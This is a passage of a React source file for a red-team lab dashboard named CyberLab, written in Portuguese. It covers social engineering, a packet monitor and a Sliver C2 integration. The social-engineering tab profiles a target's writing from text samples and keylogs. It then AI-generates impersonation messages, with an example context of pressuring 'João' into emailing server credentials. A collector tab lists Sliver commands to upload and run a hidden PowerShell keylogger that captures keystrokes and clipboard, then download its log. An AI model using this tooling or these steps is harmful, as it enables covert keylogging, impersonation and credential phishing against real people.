        <div className="space-y-3">
          <div className="bg-cyber-surface border border-cyber-border rounded-lg p-4 space-y-3">
            <h3 className="text-sm text-purple-400 font-bold">Criar Perfil Comportamental</h3>
            <p className="text-xs text-cyber-muted">Cole amostras de texto do alvo (emails, mensagens, posts). Separe cada amostra com uma linha contendo apenas <code className="text-purple-400">---</code></p>

            <div>
              <label className="text-xs text-cyber-muted block mb-1">Nome do perfil</label>
              <input type="text" value={profileName} onChange={e => setProfileName(e.target.value)}
                className="w-full bg-black/30 border border-cyber-border rounded px-3 py-1.5 text-xs text-cyber-text font-mono" />
            </div>

            <div>
              <label className="text-xs text-cyber-muted block mb-1">Amostras de texto (separadas por ---)</label>
              <textarea value={textSamples} onChange={e => setTextSamples(e.target.value)} rows={10}
                placeholder={"Oi João, tudo bem?\nPreciso que vc me envie o relatório até amanhã.\nAbs\n---\nEai pessoal, bora marcar aquele almoço?\nFalou!"}
                className="w-full bg-black/30 border border-cyber-border rounded px-3 py-2 text-xs text-cyber-text font-mono resize-y" />
            </div>

            <div>
              <label className="text-xs text-cyber-muted block mb-1">Keylog raw (opcional — dados do coletor)</label>
              <textarea value={rawKeylog} onChange={e => setRawKeylog(e.target.value)} rows={4}
                placeholder='{"ts":"2026-08-15 20:30:00","type":"keystrokes","window":"Gmail","data":"..."}'
                className="w-full bg-black/30 border border-cyber-border rounded px-3 py-2 text-xs text-cyber-text font-mono resize-y" />
            </div>

            <button onClick={analyze} disabled={loading || (!textSamples.trim() && !rawKeylog.trim())}
              className="px-4 py-2 bg-purple-600 hover:bg-purple-500 disabled:opacity-40 text-white rounded text-xs font-mono transition-colors">
              {loading ? "Analisando..." : " Analisar com IA"}
            </button>
          </div>

          {profile && (
            <div className="bg-cyber-surface border border-purple-500/30 rounded-lg p-4 space-y-3">
              <h3 className="text-sm text-purple-400 font-bold">Perfil: {profile.name}</h3>
              {profile.profile?.summary && <p className="text-xs text-cyber-text">{profile.profile.summary}</p>}

              <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                {profile.profile?.language && (
                  <div className="bg-black/20 rounded p-3 space-y-1">
                    <div className="text-xs font-bold text-purple-400">Linguagem</div>
                    <div className="text-xs text-cyber-muted">Formalidade: <span className="text-cyber-text">{profile.profile.language.formality}</span></div>
                    <div className="text-xs text-cyber-muted">Vocabulário: <span className="text-cyber-text">{profile.profile.language.vocabulary_level}</span></div>
                    <div className="text-xs text-cyber-muted">Emojis: <span className="text-cyber-text">{profile.profile.language.emoji_usage}</span></div>
                    {profile.profile.language.common_expressions?.length > 0 && (
                      <div className="text-xs text-cyber-muted">Expressões: <span className="text-cyber-text">{profile.profile.language.common_expressions.join(", ")}</span></div>
                    )}
                  </div>
                )}
                {profile.profile?.personality && (
                  <div className="bg-black/20 rounded p-3 space-y-1">
                    <div className="text-xs font-bold text-purple-400">Personalidade</div>
                    <div className="text-xs text-cyber-muted">Tom: <span className="text-cyber-text">{profile.profile.personality.tone}</span></div>
                    <div className="text-xs text-cyber-muted">Nível técnico: <span className="text-cyber-text">{profile.profile.personality.technical_level}</span></div>
                    {profile.profile.personality.traits?.length > 0 && (
                      <div className="text-xs text-cyber-muted">Traços: <span className="text-cyber-text">{profile.profile.personality.traits.join(", ")}</span></div>
                    )}
                  </div>
                )}
                {profile.profile?.patterns && (
                  <div className="bg-black/20 rounded p-3 space-y-1">
                    <div className="text-xs font-bold text-purple-400">Padrões</div>
                    <div className="text-xs text-cyber-muted">Saudação: <span className="text-cyber-text">{profile.profile.patterns.greeting_style}</span></div>
                    <div className="text-xs text-cyber-muted">Encerramento: <span className="text-cyber-text">{profile.profile.patterns.closing_style}</span></div>
                    <div className="text-xs text-cyber-muted">Pontuação: <span className="text-cyber-text">{profile.profile.patterns.punctuation}</span></div>
                  </div>
                )}
                {profile.profile?.risk_assessment && (
                  <div className="bg-black/20 rounded p-3 space-y-1">
                    <div className="text-xs font-bold text-red-400">Avaliação de Risco</div>
                    <div className="text-xs text-cyber-muted">Vulnerabilidade a phishing: <span className="text-cyber-text">{profile.profile.risk_assessment.phishing_vulnerability}</span></div>
                    {profile.profile.risk_assessment.social_engineering_vectors?.length > 0 && (
                      <div className="text-xs text-cyber-muted">Vetores: <span className="text-cyber-text">{profile.profile.risk_assessment.social_engineering_vectors.join(", ")}</span></div>
                    )}
                    {profile.profile.risk_assessment.recommendations?.length > 0 && (
                      <div className="text-xs text-cyber-muted mt-1">
                        <span className="text-green-400 font-bold">Defesa:</span>
                        <ul className="list-disc list-inside ml-1">{profile.profile.risk_assessment.recommendations.map((r,i) => <li key={i} className="text-cyber-text">{r}</li>)}</ul>
                      </div>
                    )}
                  </div>
                )}
              </div>

              <details className="text-xs">
                <summary className="text-cyber-muted cursor-pointer hover:text-cyber-text">Ver JSON completo</summary>
                <pre className="mt-2 bg-black/30 rounded p-2 overflow-x-auto text-cyber-muted text-[10px]">{JSON.stringify(profile.profile, null, 2)}</pre>
              </details>
            </div>
          )}
        </div>
      )}

      {/* ── GERAR ───────────────────────────────────────────────────── */}
      {activeSection === "generate" && (
        <div className="space-y-3">
          <div className="bg-cyber-surface border border-cyber-border rounded-lg p-4 space-y-3">
            <h3 className="text-sm text-purple-400 font-bold">Gerar Mensagem no Estilo do Alvo</h3>

            <div className="grid grid-cols-2 gap-3">
              <div>
                <label className="text-xs text-cyber-muted block mb-1">Perfil</label>
                <select value={profileName} onChange={e => setProfileName(e.target.value)}
                  className="w-full bg-black/30 border border-cyber-border rounded px-3 py-1.5 text-xs text-cyber-text font-mono">
                  {profiles.map(p => <option key={p.name} value={p.name}>{p.name}</option>)}
                  {profiles.length === 0 && <option value="">Nenhum perfil — analise primeiro</option>}
                </select>
              </div>
              <div>
                <label className="text-xs text-cyber-muted block mb-1">Tipo</label>
                <select value={genType} onChange={e => setGenType(e.target.value)}
                  className="w-full bg-black/30 border border-cyber-border rounded px-3 py-1.5 text-xs text-cyber-text font-mono">
                  <option value="email">Email</option>
                  <option value="mensagem WhatsApp">WhatsApp</option>
                  <option value="mensagem Slack">Slack</option>
                  <option value="post LinkedIn">LinkedIn</option>
                  <option value="SMS">SMS</option>
                </select>
              </div>
            </div>

            <div>
              <label className="text-xs text-cyber-muted block mb-1">Contexto / Assunto</label>
              <textarea value={genContext} onChange={e => setGenContext(e.target.value)} rows={3}
                placeholder="Pedir para o João enviar as credenciais do servidor por email, fingindo urgência"
                className="w-full bg-black/30 border border-cyber-border rounded px-3 py-2 text-xs text-cyber-text font-mono resize-y" />
            </div>

            <button onClick={generate} disabled={loading || !genContext.trim() || profiles.length === 0}
              className="px-4 py-2 bg-purple-600 hover:bg-purple-500 disabled:opacity-40 text-white rounded text-xs font-mono transition-colors">
              {loading ? "Gerando..." : " Gerar Mensagem"}
            </button>
          </div>

          {genResult && (
            <div className="bg-cyber-surface border border-purple-500/30 rounded-lg p-4">
              <div className="flex justify-between items-center mb-2">
                <h3 className="text-sm text-purple-400 font-bold">Mensagem Gerada ({genType})</h3>
                <button onClick={() => navigator.clipboard.writeText(genResult)}
                  className="text-xs text-cyber-muted hover:text-cyber-text px-2 py-1 rounded border border-cyber-border">
                  Copiar
                </button>
              </div>
              <div className="bg-black/30 rounded p-3 text-xs text-cyber-text whitespace-pre-wrap font-mono">{genResult}</div>
            </div>
          )}
        </div>
      )}

      {/* ── PERFIS ──────────────────────────────────────────────────── */}
      {activeSection === "profiles" && (
        <div className="space-y-3">
          {profiles.length === 0 ? (
            <div className="bg-cyber-surface border border-cyber-border rounded-lg p-8 text-center text-cyber-muted text-xs">
              Nenhum perfil criado. Vá em "Analisar" para criar um.
            </div>
          ) : profiles.map(p => (
            <div key={p.name} className="bg-cyber-surface border border-cyber-border rounded-lg p-4">
              <div className="flex justify-between items-start">
                <div>
                  <h3 className="text-sm text-purple-400 font-bold">{p.name}</h3>
                  <p className="text-xs text-cyber-muted mt-1">{p.profile?.summary || "Sem resumo"}</p>
                  <p className="text-[10px] text-cyber-muted mt-1">{p.sample_count} amostras · criado {new Date(p.created_at * 1000).toLocaleString("pt-BR")}</p>
                </div>
                <div className="flex gap-2">
                  <button onClick={() => { setProfileName(p.name); setProfile(p); setActiveSection("analyze"); }}
                    className="text-xs text-purple-400 hover:text-purple-300 px-2 py-1 rounded border border-purple-500/30">Ver</button>
                  <button onClick={async () => { await apiFetch(`/social/profiles/${p.name}`, { method: "DELETE" }); loadProfiles(); }}
                    className="text-xs text-red-400 hover:text-red-300 px-2 py-1 rounded border border-red-500/30">Deletar</button>
                </div>
              </div>
            </div>
          ))}
        </div>
      )}

      {/* ── COLETOR ─────────────────────────────────────────────────── */}
      {activeSection === "collector" && (
        <div className="space-y-3">
          <div className="bg-cyber-surface border border-cyber-border rounded-lg p-4 space-y-3">
            <h3 className="text-sm text-purple-400 font-bold">Deploy do Coletor Comportamental</h3>
            <p className="text-xs text-cyber-muted">Script PowerShell que captura janelas ativas, clipboard e teclas digitadas na VM alvo. Os dados ficam em <code className="text-purple-400">%TEMP%\svc_perf.log</code> como JSON lines.</p>

            <div className="bg-black/20 rounded p-3 space-y-2">
              <div className="text-xs font-bold text-purple-400">Via Sliver Beacon:</div>
              <div className="text-xs text-cyber-muted space-y-1.5">
                <p>1. No console Sliver, com o beacon selecionado:</p>
                <code className="block bg-black/40 rounded px-2 py-1 text-green-400">upload /home/mengola/Desktop/Cyberlab/tools/collector.ps1 C:\\Windows\\Temp\\svc.ps1</code>
                <p>2. Executar em background:</p>
                <code className="block bg-black/40 rounded px-2 py-1 text-green-400">execute -o powershell.exe -ArgumentList "-ep bypass -w hidden -f C:\\Windows\\Temp\\svc.ps1"</code>
                <p>3. Após 5 minutos, baixar o log:</p>
                <code className="block bg-black/40 rounded px-2 py-1 text-green-400">download C:\\Users\\*\\AppData\\Local\\Temp\\svc_perf.log</code>
                <p>4. Cole o conteúdo do log no campo "Keylog raw" da aba Analisar</p>
              </div>
            </div>

            <div className="bg-black/20 rounded p-3 space-y-2">
              <div className="text-xs font-bold text-purple-400">Sem Sliver (manual):</div>
              <div className="text-xs text-cyber-muted space-y-1.5">
                <p>1. Copie o script para a VM</p>
                <p>2. Abra PowerShell como Admin:</p>
                <code className="block bg-black/40 rounded px-2 py-1 text-green-400">powershell -ep bypass -f collector.ps1</code>
                <p>3. Use a VM normalmente por 5 minutos</p>
                <p>4. O log estará em <code className="text-purple-400">%TEMP%\svc_perf.log</code></p>
              </div>
            </div>

            <div className="bg-amber-500/10 border border-amber-500/30 rounded p-3">
              <div className="text-xs text-amber-400 font-bold"> Configuração do coletor</div>
              <div className="text-xs text-cyber-muted mt-1">
                Duração padrão: <strong className="text-cyber-text">5 minutos</strong>. Edite <code className="text-purple-400">$Duration</code> no script para alterar.
                O script captura: títulos de janela, clipboard e keystrokes.
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}


// ─── Network Monitor ──────────────────────────────────────────────────────
function NetworkMonitor({ sliver: sliverCtx }) {
  const [packets, setPackets] = useState([]);
  const [capturing, setCapturing] = useState(false);
  const [config, setConfig] = useState({ interface: "", filter_proto: "", filter_ip: "", filter_port: 0, max_packets: 500, duration: 30 });
  const [stats, setStats] = useState({ tcp: 0, udp: 0, icmp: 0, other: 0, total: 0 });
  const [displayFilter, setDisplayFilter] = useState("");
  const [selectedPkt, setSelectedPkt] = useState(null);
  const [autoScroll, setAutoScroll] = useState(true);
  const tableRef = useRef(null);
  const evtSourceRef = useRef(null);

  const bridgeUrl = sliverCtx.bridgeUrl;
  const bridgeKey = sliverCtx.bridgeKey;

  const startCapture = () => {
    if (!bridgeUrl) return;
    setPackets([]);
    setStats({ tcp: 0, udp: 0, icmp: 0, other: 0, total: 0 });
    setCapturing(true);
    setSelectedPkt(null);

    const url = `${bridgeUrl}/capture`;
    fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json", "X-Bridge-Api-Key": bridgeKey },
      body: JSON.stringify(config),
    }).then(async res => {
      const reader = res.body.getReader();
      const decoder = new TextDecoder();
      let buffer = "";

      while (true) {
        const { done, value } = await reader.read();
        if (done) break;
        buffer += decoder.decode(value, { stream: true });
        const lines = buffer.split("\n");
        buffer = lines.pop();

        for (const line of lines) {
          if (!line.startsWith("data: ")) continue;
          try {
            const pkt = JSON.parse(line.slice(6));
            if (pkt.done) { setCapturing(false); return; }
            if (pkt.error) { setCapturing(false); return; }
            setPackets(prev => {
              const next = [...prev, { ...pkt, _idx: prev.length }];
              return next.length > 2000 ? next.slice(-1500) : next;
            });
            setStats(s => ({
              ...s,
              total: s.total + 1,
              tcp: s.tcp + (pkt.proto === "TCP" ? 1 : 0),
              udp: s.udp + (pkt.proto === "UDP" ? 1 : 0),
              icmp: s.icmp + (pkt.proto === "ICMP" ? 1 : 0),
              other: s.other + (!["TCP", "UDP", "ICMP"].includes(pkt.proto) ? 1 : 0),
            }));
          } catch {}
        }
      }
      setCapturing(false);
    }).catch(() => setCapturing(false));
  };

  const stopCapture = async () => {
    if (!bridgeUrl) return;
    try {
      await fetch(`${bridgeUrl}/capture/stop`, {
        method: "POST",
        headers: { "X-Bridge-Api-Key": bridgeKey },
      });
    } catch {}
    setCapturing(false);
  };

  useEffect(() => {
    if (autoScroll && tableRef.current) {
      tableRef.current.scrollTop = tableRef.current.scrollHeight;
    }
  }, [packets.length, autoScroll]);

  useEffect(() => () => { if (evtSourceRef.current) evtSourceRef.current.close(); }, []);

  const filtered = displayFilter
    ? packets.filter(p => {
        const f = displayFilter.toLowerCase();
        return p.proto.toLowerCase().includes(f) || p.src.includes(f) || p.dst.includes(f) ||
               String(p.src_port).includes(f) || String(p.dst_port).includes(f) ||
               (p.service || "").toLowerCase().includes(f) || (p.preview || "").toLowerCase().includes(f);
      })
    : packets;

  const protoColor = (proto) => {
    switch (proto) {
      case "TCP": return "#3b82f6";
      case "UDP": return "#22c55e";
      case "ICMP": return "#f59e0b";
      default: return "#64748B";
    }
  };

  if (!bridgeUrl) {
    return (
      <div className={`${CARD} text-center py-10 text-cyber-muted`}>
        <div className="text-2xl mb-2"></div>
        <div className="text-xs">Bridge não configurada. Configure VITE_SLIVER_BRIDGE_URL no .env</div>
      </div>
    );
  }

  return (
    <div>
      <InfoBox title={SECTION_INFO.netmon.title} icon={SECTION_INFO.netmon.icon}>{SECTION_INFO.netmon.content}</InfoBox>

      <div className="grid grid-cols-2 sm:grid-cols-5 gap-3 mb-4">
        {[
          { label: "Total", val: stats.total, cls: "text-cyber-text" },
          { label: "TCP", val: stats.tcp, cls: "text-[#3b82f6]" },
          { label: "UDP", val: stats.udp, cls: "text-[#22c55e]" },
          { label: "ICMP", val: stats.icmp, cls: "text-[#f59e0b]" },
          { label: "Outros", val: stats.other, cls: "text-cyber-muted" },
        ].map(s => (
          <div key={s.label} className={`${CARD} text-center`}>
            <div className={`text-xl font-extrabold ${s.cls}`}>{s.val}</div>
            <div className="text-[10px] text-cyber-muted mt-1">{s.label}</div>
          </div>
        ))}
      </div>

      <div className={`${CARD} mb-4`}>
        <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 mb-3">
          <div>
            <label className={LABEL}>Interface / IP</label>
            <input className={INPUT} placeholder="auto" value={config.interface} onChange={e => setConfig({ ...config, interface: e.target.value })} />
          </div>
          <div>
            <label className={LABEL}>Protocolo</label>
            <select className={INPUT} value={config.filter_proto} onChange={e => setConfig({ ...config, filter_proto: e.target.value })}>
              <option value="">Todos</option>
              <option value="tcp">TCP</option>
              <option value="udp">UDP</option>
              <option value="icmp">ICMP</option>
            </select>
          </div>
          <div>
            <label className={LABEL}>Filtrar IP</label>
            <input className={INPUT} placeholder="ex: 192.168.1.100" value={config.filter_ip} onChange={e => setConfig({ ...config, filter_ip: e.target.value })} />
          </div>
          <div>
            <label className={LABEL}>Filtrar Porta</label>
            <input className={INPUT} type="number" placeholder="0 = todas" value={config.filter_port || ""} onChange={e => setConfig({ ...config, filter_port: parseInt(e.target.value) || 0 })} />
          </div>
        </div>
        <div className="grid grid-cols-2 sm:grid-cols-3 gap-3 mb-3">
          <div>
            <label className={LABEL}>Max Pacotes</label>
            <input className={INPUT} type="number" value={config.max_packets} onChange={e => setConfig({ ...config, max_packets: parseInt(e.target.value) || 500 })} />
          </div>
          <div>
            <label className={LABEL}>Duração (seg)</label>
            <input className={INPUT} type="number" value={config.duration} onChange={e => setConfig({ ...config, duration: parseInt(e.target.value) || 30 })} />
          </div>
          <div className="flex items-end gap-2">
            {!capturing ? (
              <button onClick={startCapture} className={BTN}> CAPTURAR</button>
            ) : (
              <button onClick={stopCapture} className={`${BTN} !bg-cyber-danger`}>■ PARAR</button>
            )}
          </div>
        </div>
      </div>

      <div className="flex items-center gap-3 mb-2">
        <input className={`${INPUT} flex-1`} placeholder=" Display filter (IP, porta, protocolo, serviço...)" value={displayFilter} onChange={e => setDisplayFilter(e.target.value)} />
        <label className="flex items-center gap-1.5 text-[10px] text-cyber-muted cursor-pointer">
          <input type="checkbox" checked={autoScroll} onChange={e => setAutoScroll(e.target.checked)} className="accent-cyber-accent" />
          Auto-scroll
        </label>
        <span className="text-[10px] text-cyber-muted font-mono">{filtered.length} pkts</span>
      </div>

      <div ref={tableRef} className="overflow-auto max-h-[450px] border border-cyber-border rounded-lg">
        <table className="w-full text-[10px] font-mono">
          <thead className="sticky top-0 bg-cyber-surface z-10">
            <tr className="text-cyber-muted border-b border-cyber-border">
              <th className="text-left px-2 py-1.5">#</th>
              <th className="text-left px-2 py-1.5">Proto</th>
              <th className="text-left px-2 py-1.5">Source</th>
              <th className="text-left px-2 py-1.5">Destination</th>
              <th className="text-left px-2 py-1.5">Port</th>
              <th className="text-left px-2 py-1.5">Service</th>
              <th className="text-left px-2 py-1.5">Size</th>
              <th className="text-left px-2 py-1.5">Info</th>
            </tr>
          </thead>
          <tbody>
            {filtered.map((pkt, i) => (
              <tr key={i} onClick={() => setSelectedPkt(pkt)} className={`border-b border-cyber-border/30 cursor-pointer transition-colors ${selectedPkt?._idx === pkt._idx ? "bg-cyber-accent/10" : "hover:bg-white/[0.02]"}`}>
                <td className="px-2 py-1 text-cyber-muted">{pkt._idx}</td>
                <td className="px-2 py-1" style={{ color: protoColor(pkt.proto) }}>{pkt.proto}</td>
                <td className="px-2 py-1 text-cyber-text">{pkt.src}</td>
                <td className="px-2 py-1 text-cyber-text">{pkt.dst}</td>
                <td className="px-2 py-1 text-cyber-muted">{pkt.src_port}→{pkt.dst_port}</td>
                <td className="px-2 py-1 text-indigo-400">{pkt.service}</td>
                <td className="px-2 py-1 text-cyber-muted">{pkt.size}B</td>
                <td className="px-2 py-1 text-cyber-muted truncate max-w-[200px]">{pkt.flags}{pkt.preview ? ` ${pkt.preview.slice(0, 60)}` : ""}</td>
              </tr>
            ))}
          </tbody>
        </table>
        {packets.length === 0 && !capturing && (
          <div className="text-center py-10 text-cyber-muted text-[11px]">
            <div className="text-2xl mb-2"></div>
            Clique CAPTURAR para iniciar a captura de pacotes
          </div>
        )}
        {capturing && packets.length === 0 && (
          <div className="text-center py-6 text-cyber-accent text-[11px] animate-pulse">Capturando pacotes...</div>
        )}
      </div>

      {selectedPkt && (
        <div className={`${CARD} mt-3`}>
          <div className="flex justify-between items-center mb-2">
            <span className="text-[10px] font-mono font-bold text-cyber-muted tracking-widest">DETALHES DO PACOTE #{selectedPkt._idx}</span>
            <button onClick={() => setSelectedPkt(null)} className={`${BTN_GHOST} text-[10px]`}></button>
          </div>
          <div className="grid grid-cols-2 sm:grid-cols-4 gap-2 text-[11px]">
            <div><span className="text-cyber-muted">Proto:</span> <span style={{ color: protoColor(selectedPkt.proto) }}>{selectedPkt.proto}</span></div>
            <div><span className="text-cyber-muted">TTL:</span> <span className="text-cyber-text">{selectedPkt.ttl}</span></div>
            <div><span className="text-cyber-muted">Size:</span> <span className="text-cyber-text">{selectedPkt.size} bytes</span></div>
            <div><span className="text-cyber-muted">Service:</span> <span className="text-indigo-400">{selectedPkt.service || "—"}</span></div>
            <div><span className="text-cyber-muted">Source:</span> <span className="text-cyber-text">{selectedPkt.src}:{selectedPkt.src_port}</span></div>
            <div><span className="text-cyber-muted">Dest:</span> <span className="text-cyber-text">{selectedPkt.dst}:{selectedPkt.dst_port}</span></div>
            <div><span className="text-cyber-muted">Flags:</span> <span className="text-amber-400">{selectedPkt.flags || "—"}</span></div>
            <div><span className="text-cyber-muted">Time:</span> <span className="text-cyber-text">{new Date(selectedPkt.ts * 1000).toLocaleTimeString("pt-BR", { hour12: false, fractionalSecondDigits: 3 })}</span></div>
          </div>
          {selectedPkt.preview && (
            <div className="mt-2 pt-2 border-t border-cyber-border">
              <div className="text-[10px] text-cyber-muted mb-1">PAYLOAD PREVIEW:</div>
              <pre className="bg-black/40 rounded p-2 text-[10px] font-mono text-cyber-accent whitespace-pre-wrap break-all">{selectedPkt.preview}</pre>
            </div>
          )}
        </div>
      )}
    </div>
  );
}

// ─── App ───────────────────────────────────────────────────────────────────
const TAB_GROUPS = [
  { group: "Principal", tabs: [
    { id: "overview", label: "Overview", icon: "-"},
    { id: "sessions", label: "Sessões", icon: "-"},
    { id: "techniques", label: "Técnicas", icon: "-"},
    { id: "timeline", label: "Linha do Tempo", icon: "-"},
  ]},
  { group: "Lab", tabs: [
    { id: "vms", label: "VMs do Lab", icon: "-"},
    { id: "credentials", label: "Credenciais", icon: "-"},
    { id: "netmap", label: "Rede", icon: "-"},
    { id: "labcheck", label: "Lab Check", icon: "-"},
  ]},
  { group: "Offensive", tabs: [
    { id: "mitre", label: "MITRE ATT&CK", icon: "-"},
    { id: "dorks", label: "Google Dorks", icon: "-"},
    { id: "cyberscan", label: "CyberScan", icon: "-"},
    { id: "beacon-lab", label: "Beacon Lab", icon: "-"},
    { id: "virustotal", label: "VirusTotal", icon: "-"},
    { id: "ioc", label: "IOC Tracker", icon: "-"},
    { id: "scripts", label: "Script Arsenal", icon: "-"},
    { id: "playbooks", label: "Playbooks", icon: "-"},
    { id: "netmon", label: "Net Monitor", icon: "-"},
    { id: "social", label: "Social Eng.", icon: "-"},
  ]},
  { group: "Estudo", tabs: [
    { id: "scoring", label: "Ranking", icon: "-"},
    { id: "flashcards", label: "Flashcards", icon: "🃏" },
    { id: "studycards", label: "Provas", icon: "-"},

    { id: "compare", label: "Comparar Sessões", icon: "-"},
    { id: "writeup", label: "Writeup", icon: "-"},
    { id: "navigator", label: "ATT&CK Export", icon: "-"},
  ]},
];
const TABS = TAB_GROUPS.flatMap(g => g.tabs);

export default function CyberLabDashboard() {
  const [tab, setTab] = useState("overview");
  const [sessions, setSessions] = useState([]);
  const [techniques, setTechniques] = useState([]);
  const [vms, setVms] = useState([]);
  const [credentials, setCredentials] = useState([]);
  const [loaded, setLoaded] = useState(false);
  const [error, setError] = useState(null);
  const [c2Target, setC2Target] = useState(null);
  const [searchQuery, setSearchQuery] = useState("");
  const [menuOpen, setMenuOpen] = useState(false);
  const sliver = useSliver();
  const allTabs = sliver.enabled ? [...TABS, { id: "c2", label: "Sliver C2", icon: "-"}] : TABS;
  const allGroups = sliver.enabled ? [...TAB_GROUPS, { group: "C2", tabs: [{ id: "c2", label: "Sliver C2", icon: "-"}] }] : TAB_GROUPS;

  useEffect(() => {
    (async () => {
      try {
        const [s, t, v, c] = await Promise.all([fetchSessions(), fetchTechniques(), fetchVms(), fetchCredentials()]);
        setSessions(s);
        setTechniques(t);
        setVms(v);
        setCredentials(c);
      } catch (err) {
        setError(err.message);
      } finally {
        setLoaded(true);
      }
    })();
  }, []);

  useEffect(() => {
    const channel = supabase
      .channel("cyberlab-live")
      .on("postgres_changes", { event: "*", schema: "public", table: "lab_sessions" }, payload => {
        setSessions(prev => applyRealtimeChange(prev, payload));
      })
      .on("postgres_changes", { event: "*", schema: "public", table: "techniques" }, payload => {
        setTechniques(prev => applyRealtimeChange(prev, payload));
      })
      .on("postgres_changes", { event: "*", schema: "public", table: "lab_vms" }, payload => {
        setVms(prev => applyRealtimeChange(prev, payload));
      })
      .on("postgres_changes", { event: "*", schema: "public", table: "credentials" }, payload => {
        setCredentials(prev => applyRealtimeChange(prev, payload));
      })
      .subscribe();

    return () => { supabase.removeChannel(channel); };
  }, []);

  const searchResults = (() => {
    const q = searchQuery.trim().toLowerCase();
    if (!q) return null;
    return {
      sessions: sessions.filter(s => s.title?.toLowerCase().includes(q) || s.objective?.toLowerCase().includes(q)).slice(0, 5),
      techniques: techniques.filter(t => t.technique_name?.toLowerCase().includes(q) || t.mitre_id?.toLowerCase().includes(q)).slice(0, 5),
      vms: vms.filter(v => v.name?.toLowerCase().includes(q) || v.ip_address?.toLowerCase().includes(q)).slice(0, 5),
    };
  })();
  const searchHasResults = searchResults && (searchResults.sessions.length + searchResults.techniques.length + searchResults.vms.length) > 0;

  if (!loaded) return (
    <div className="min-h-screen flex items-center justify-center text-cyber-accent font-mono">
      Carregando lab<span className="animate-blink">_</span>
    </div>
  );

  if (error) return (
    <div className="min-h-screen flex items-center justify-center text-cyber-danger font-mono p-5 text-center">
      Erro ao conectar no Supabase: {error}
    </div>
  );

  return (
    <div className="min-h-screen text-cyber-text font-mono">
      {/* Header */}
      <div className="bg-cyber-surface border-b border-cyber-border px-4 py-2.5 flex items-center gap-3 sticky top-0 z-40">
        <button onClick={() => setMenuOpen(!menuOpen)} className="bg-transparent border-none cursor-pointer p-1 text-cyber-muted hover:text-cyber-accent">
          <svg width="20" height="20" viewBox="0 0 20 20" fill="none"><rect y="3" width="20" height="2" rx="1" fill="currentColor" /><rect y="9" width="20" height="2" rx="1" fill="currentColor" /><rect y="15" width="20" height="2" rx="1" fill="currentColor" /></svg>
        </button>
        <img src={logo} alt="CyberLab" className="w-7 h-7 rounded-lg object-cover animate-pulse-glow" />
        <div className="text-sm font-extrabold text-cyber-accent tracking-widest [text-shadow:0_0_12px_rgba(220,38,38,0.6)]">CYBERLAB</div>
        <div className="ml-auto flex items-center gap-2">
          {sliver.enabled && (
            <span className="w-1.5 h-1.5 rounded-full inline-block animate-pulse" style={{ background: SLIVER_STATUS[sliver.status].color }} title={SLIVER_STATUS[sliver.status].label} />
          )}
          <span className="text-[10px] text-cyber-muted hidden sm:inline">{allTabs.find(t => t.id === tab)?.icon} {allTabs.find(t => t.id === tab)?.label}</span>
          <button onClick={() => supabase.auth.signOut()} className={`${BTN_GHOST} text-[10px] px-2 py-0.5`}>SAIR</button>
        </div>
      </div>

      {/* Sidebar / Hamburger Menu */}
      {menuOpen && <div className="fixed inset-0 bg-black/60 z-[90]" onClick={() => setMenuOpen(false)} />}
      <div className={`fixed top-0 left-0 h-full w-72 bg-cyber-surface border-r border-cyber-border z-[95] overflow-y-auto transition-transform duration-200 ${menuOpen ? "translate-x-0" : "-translate-x-full"}`}>
        <div className="px-4 py-3 border-b border-cyber-border flex items-center gap-2">
          <img src={logo} alt="CyberLab" className="w-8 h-8 rounded-lg object-cover animate-pulse-glow" />
          <div>
            <div className="text-sm font-extrabold text-cyber-accent tracking-widest">CYBERLAB</div>
            <div className="text-[9px] text-cyber-muted">Red Team Lab Management System</div>
          </div>
          <button onClick={() => setMenuOpen(false)} className="ml-auto bg-transparent border-none text-cyber-muted hover:text-cyber-text cursor-pointer text-lg"></button>
        </div>

        {/* Search */}
        <div className="px-4 py-3 border-b border-cyber-border">
          <input className={`${INPUT} text-xs`} placeholder=" Buscar..." value={searchQuery} onChange={e => setSearchQuery(e.target.value)} />
          {searchQuery.trim() && (
            <div className="mt-2 space-y-1 max-h-48 overflow-y-auto">
              {!searchHasResults && <div className="text-[11px] text-cyber-muted">Nenhum resultado</div>}
              {searchResults?.sessions.map(s => (
                <button key={s.id} onClick={() => { setTab("sessions"); setSearchQuery(""); setMenuOpen(false); }} className="block w-full text-left text-[11px] text-cyber-text hover:text-cyber-accent py-0.5 truncate"> {s.title}</button>
              ))}
              {searchResults?.techniques.map(t => (
                <button key={t.id} onClick={() => { setTab("techniques"); setSearchQuery(""); setMenuOpen(false); }} className="block w-full text-left text-[11px] text-cyber-text hover:text-cyber-accent py-0.5 truncate"> {t.technique_name}</button>
              ))}
              {searchResults?.vms.map(v => (
                <button key={v.id} onClick={() => { setTab("vms"); setSearchQuery(""); setMenuOpen(false); }} className="block w-full text-left text-[11px] text-cyber-text hover:text-cyber-accent py-0.5 truncate"> {v.name}</button>
              ))}
            </div>
          )}
        </div>

        {/* Stats */}
        <div className="px-4 py-2 border-b border-cyber-border flex gap-3 text-[10px] text-cyber-muted">
          <span>{sessions.length} sessões</span>
          <span>{techniques.length} técnicas</span>
          <span>{vms.length} VMs</span>
        </div>

        {/* Nav groups */}
        <div className="py-2">
          {allGroups.map(g => (
            <div key={g.group}>
              <div className="px-4 pt-3 pb-1 text-[9px] font-bold text-cyber-muted/50 tracking-widest uppercase">{g.group}</div>
              {g.tabs.map(t => (
                <button
                  key={t.id}
                  onClick={() => { setTab(t.id); setMenuOpen(false); }}
                  className={`w-full text-left px-4 py-2 text-[12px] font-mono flex items-center gap-2 transition-colors border-none cursor-pointer ${tab === t.id ? "bg-cyber-accent/10 text-cyber-accent border-l-2 border-l-cyber-accent" : "bg-transparent text-cyber-muted hover:text-cyber-text hover:bg-white/5"}`}
                >
                  <span>{t.icon}</span><span>{t.label}</span>
                </button>
              ))}
            </div>
          ))}
        </div>

        {/* Bottom actions */}
        <div className="px-4 py-3 border-t border-cyber-border mt-2 space-y-2">
          {sliver.enabled && (
            <button onClick={sliver.refresh} className="w-full text-left text-[11px] font-mono flex items-center gap-2 bg-transparent border-none cursor-pointer py-1" style={{ color: SLIVER_STATUS[sliver.status].color }}>
              <span className={`w-2 h-2 rounded-full inline-block ${sliver.status === "connected" ? "animate-pulse" : ""}`} style={{ background: SLIVER_STATUS[sliver.status].color }} />
              {SLIVER_STATUS[sliver.status].label}
            </button>
          )}
